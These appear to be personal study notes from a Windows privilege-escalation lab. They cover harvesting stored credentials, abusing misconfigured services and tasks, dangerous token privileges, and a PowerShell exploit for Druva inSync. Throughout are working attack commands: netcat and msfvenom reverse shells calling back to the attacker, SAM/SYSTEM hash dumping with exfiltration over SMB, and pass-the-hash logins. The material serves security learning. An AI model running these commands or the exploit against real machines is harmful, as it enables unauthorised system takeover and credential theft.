- Creds lying around in text files or spreadsheets
- Misconfigurations on services or scheduled tasks
- Vulnerable software
- Missing security patches

### Users
Admin - part of an Administrators group, can change system configs and access any file
Standard User - limited to their own files
SYSTEM / LocalSystem - God mode
Local Service - runs Windows services with "minimum" privs, uses anonymous connections
Network Service - same as Local, but uses creds to authenticate connections
  

# Harvesting Passwords

### Unattended Windows Installation
Admins may use Windows Deployment Services, allowing for distribution of a standard image.These then require admin to finish setup, leaving the credentials in the following places:
```
- C:\Unattend.xml  
- C:\Windows\Panther\Unattend.xml  
- C:\Windows\Panther\Unattend\Unattend.xml  
- C:\Windows\system32\sysprep.inf  
- C:\Windows\system32\sysprep\sysprep.xml  
```
  

### Powershell History
from cmd.exe `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` to get history which may contain plaintext passwords

### Saved Credentials
`cmdkey /list` will list any saved credentials for other users, wont show passwords.
Feed this to `runas /savecred /user:admin cmd.exe` to attempt running cmd as another user

### IIS Configuration
Internet Information Services, default web server on WIndows install. Check `web.config` for database passwords or authentication mechanisms.
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
find database connection strings in file: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

### PuTTY: Retrieve Creds from Software
Users can store sessions with IP, user, and other configs for convenience. Stores proxy configs which include cleartext authentication creds. 
`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s` to search configuration for stored proxy creds (Simon Tatham is part of the standard path, not a user)
Other software will have similar setups that are equally susceptible to containing user creds


# Quick Wins

### Scheduled Tasks
`schtasks` - to list scheduled tasks that may have lost a binary, or are using a modifiable binary
`schtasks /query /tn \TASK_PATH /fo list /v`
Check "Task to Run" and "User to Run" and check see if task is writeable, and if that user has more privileges than the current user
Check permissions with `icacls` where (F) is "full access"
ex. where we have full access to the file. Write to the file to initiate a reverse shell with `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`

### AlwaysInstallElevated
Windows installer files = .msi files, can be configured to run at higher privileges from any user account.
This requires 2 values to be set:
`reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer` and `reg query HKEY_LOCAL_MACHINE ...(same path)`
Then use msfvenom to generate a malicious .msi payload:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=LOCAL_IP LPORT=PORT -f msi > EXPLOIT.msi`, with a listener ready to receive connection
`msiexec /quiet /qn /i C:\Windows\Temp\EXPLOIT.msi` to run exploit, no UI, and logging status updates

  

# Service Misconfigurations

### Windows Services
services are managed by Service Control Manager (SCM), it changes service states and configs. Every service is started by an executable run by SCM. Service executables have special functionality to spin up as services, and will specify what user account it will run under. 
`sc qc apphostsvc` - queries the config information for a service (apphostsvc)
Look at "BINARY_PATH_NAME" and "SERVICE_START_NAME".
Discretionary Access Control List DACL gives detailed permissions for each user on a service.
Service configs are in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\` - executable will be under "ImagePath" and user as "Object Name"

### Insecure Permissions on Service Executable
If a service executable has insecure permissions, we can overwrite it and restart the process to execute our code
Example.
1. `sc qc WindowsScheduler` -> `icacls PATH\WService.exe` show that group: Everyone has modify privileges
2. create msfvenom payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f exe-service > FILE.exe`
3. serve on python server and grab with wget (with powershell) on target `wget http://LOCAL:PORT/FILE.exe -O FILE2.exe` (
4. Replace WService.exe with new shell.exe
	- cd to PATH, `move` old file to .bkp backup, `move` in new service exe as same name, and `icalcs WService.exe /grant Everyone:F` to allow full permissions
5. `sc stop windowsscheduler`, `sc start windows1scheduler` (PowerShell uses sc.exe since sc is aliased to Set-Content)
6. Receive reverse shell on linux with svcuser1 privileges

### Unquoted Service Paths
When spaces are present in a path name for a service, the command becomes ambiguous. Ex. "`disk sorter enterprise`" will look for a path to a "`..\Disk.exe`" or "`..\Disk Sorter.exe`" or "`..\Disk Sorter Enterprise\..\disksrs.exe`" as Service Control Manager will try to help the user by parsing the non-literal.

If a path tested before the correct one can be written to (typically not `\Program Files` or `\Program Files (x86)`) then we can insert an exploit service exec.
An admin may put services in a non-standard, writeable path :)
Example.
1. Admin installed Disk Sorter to `C:\MyPrograms\MyPrograms` which we `icacls` and see it inherits C dirs AD and WD privileges, meaning we can add sub dirs and files
2. Generate a reverse shell payload with `msfvenom`, `-f exe-service` and upload to target with python server
3. `wget` the hosted file and move it to `MyPrograms` to be searched and executed before `Disk Sorter Enterprise`, we do this by naming it `Disk.exe`
4. `icacls Disk.exe /grant Everyone:F` to give full perms on the new payload
5.  Open a listener on local and then stop and start the service `sc start/stop "disk sorter enterprise"`
6. Get shell on local :)

### Insecure Service Permissions
Even if the service executable DACL (Discretionary Access Control List) is locked down, the service itself may not be, meaning we can modify the config of the service. We can point it to any executable we need to run and with any account.
`Sysinternals` offers `accesschk` which gives service DACLs
Example.
1. `acesschk64.exe -qlc thmservice` checks thmservice's DACL, revealing that Users has SERVICE_ALL_ACCESS, so any user can reconfig the service
2. Build another `exe-service` reverse shell with `msfvenom`, and transfer to the system in a writable dir (I used `C:\Users\thm-unpriv`)
3. Grant full permissions to this .exe `icacls ...`
4. `sc config THMService binPath= "C:\Users\thm-unpriv\shell.exe" obj= LocalSystem` to change the services bin path to our new executable and tell it to run as the LocalSystem (root)
5. `sc stop THMService` and `sc start THMService`
6. Get shell

# Abusing Dangerous Privileges
### Windows Privileges
Rights given to users to perform system-related tasks (not the same as DACL controls). 
`whoami /priv`

### SeBackup / SeRestore 
Gives full read and write to any file, ignoring DACL
Ex. 
1. login to user who is in "Backup Operators" group, run `cmd.exe` as Administrator to activate SeBackup/Restore rights
2. `reg save hklm\system C\Users\THMBackup\system.hive` and equivalent for `hklm\sam` to backup SAM and SYSTEM hashes to the drive
3. Using SMB server with a network share(or other method), transfer files to local system
	- on local: `mkdir share` -> `python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`, creates a share, "public", pointing to "share" directory using Windows user creds
	- on target: `copy C:\Users\THMBackup\sam.hive \\LOCAL_IP\public\ ` (and for `system.hive`)
4. Using [[impacket]], dump user's password hashes
	1. `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL` 
5. Using impacket again, to perform a Pass-the-Hash login 
	1. `python3.9 /opt/impacket/examples/psexec.py -hashes ADMIN_HASH_HERE administrator@TARGET_IP`
6. Gain admin shell

### SeTakeOwnership
User can take ownership of any object on the system (files, reg keys, etc.). 
Search for processes running as LocalSystem or Admin `sc //localhost query` -> `sc qc SERVICE_NAME` OR `wmic service get name,startname`
Ex.
1. Login to given user who has SeTakeOwnership flag
2. The exercise directs us to attack `utilman.exe`, which provides the Ease of Access options at the lock screen and runs as SYSTEM, but any SYSTEM level service will do.
3.  Take ownership: `takeown /f C:\Windows\System32\Utilman.exe`
4. Give self full privileges over the file: `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
5. Replace the executable with cmd.exe: `copy cmd.exe utilman.exe`
6. Trigger the utilman service by locking the screen and clicking on Ease of Access
7. a system shell opens up :)

### SeImpersonate / SeAssignPrimaryToken
Impersonate allow user to spawn a process under the security context of another user (use case: FTP tries to retrieve files for Ann, but needs Ann's security context, not FTPs)
`LOCAL SERVICE` and `NETWORK SERVICE ACCOUNTS` already have these privileges since they spawn services for restricted accounts, using their privileges.
1. Spawn a process for users to connect and authenticate to for impersonation.
2. Force a privileged user to connect and authenticate to the spawned process.
Ex. 
1. Exercise directs us to the RogueWinRM exploit, and we assume we compromise a website with IIS (Internet Information Services) and planted a webshell 
2. `whoami /priv` through the webshell, and see that SeImpersonate is set (and SeAssignPrimaryToken)
3. RogueWinRM is already on the system, but typically we would GitHub and transfer it over
	1. When starting BITS. Windows by default creates a SYSTEM privilege connection to port 5985 for a WinRM service to use, BUT if the target doesn't have WinRM, we can hijack that session authentication and get SYSTEM with SeImpersonate
4. Trigger RogueWinRM with: ````shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe LOCAL_IP PORT"````, through the webshell (`-a` is "arguement" to run) 
5. Get system shell :)

# Abusing Vulnerable Software
`wmic product get name,version,vendor`
This will not provide ALL software available, only those installed through standard methods. Still check services and desktop shortcuts.
Example:
	Druva inSync 6.6.3 - provides endpoint data backup and gives a RPC over port 6064 with SYSTEM privileges. The intent was for another system to connect and provide a binary to run, but the reality is being able to run any command. A patch tried to run the command from the proper dir where the binary was supposed to be, but that was still vulnerable to path traversal via `..\..\..\` escapes.

Exploit code (Powershell):
```

$ErrorActionPreference = "Stop"  
  
$cmd = "net user pwnd /add & net localgroup administrators pwnd /add"  
  
$s = New-Object System.Net.Sockets.Socket(  
    [System.Net.Sockets.AddressFamily]::InterNetwork,  
    [System.Net.Sockets.SocketType]::Stream,  
    [System.Net.Sockets.ProtocolType]::Tcp  
)  
$s.Connect("127.0.0.1", 6064)  
  
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")  
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")  
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");  
$length = [System.BitConverter]::GetBytes($command.Length);  
  
$s.Send($header)  
$s.Send($rpcType)  
$s.Send($length)  
$s.Send($command)  

```

1. send a "hello" header to initiate a session with the software
2. request access to a specific (vulnerable) RPC call from the software
3. send the length of the of the incoming command (but calculated after the command is generated locally)
4. send the command, $cmd, which creates an account and adds it to the admin group
5. run a cmd.exe as Administrator and input new account creds, get Admin shell

# Tools of the Trade
### WinPEAS
[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)  
gives A LOT of info, best to output to a file `winpeas.exe > winpeas_text.txt`

### PrivescCheck
[https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) 
somewhat more lightweight alternative, as a PowerShell script. May need to run `Set-ExecutionPolicy Bypass -Scope process -Force`

### WES-NG (Windows Exploit Suggester - Next Gen)
[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)  
runs on local machine when provided a `systeminfo > systeminfo.txt` from the target machine
Be sure to run `wes.py --update` to get the latest vuln info

### Metasploit
if a meterpreter shell has already been establish on the target, `run multi/recon/local_exploit_suggester` will give priv esc paths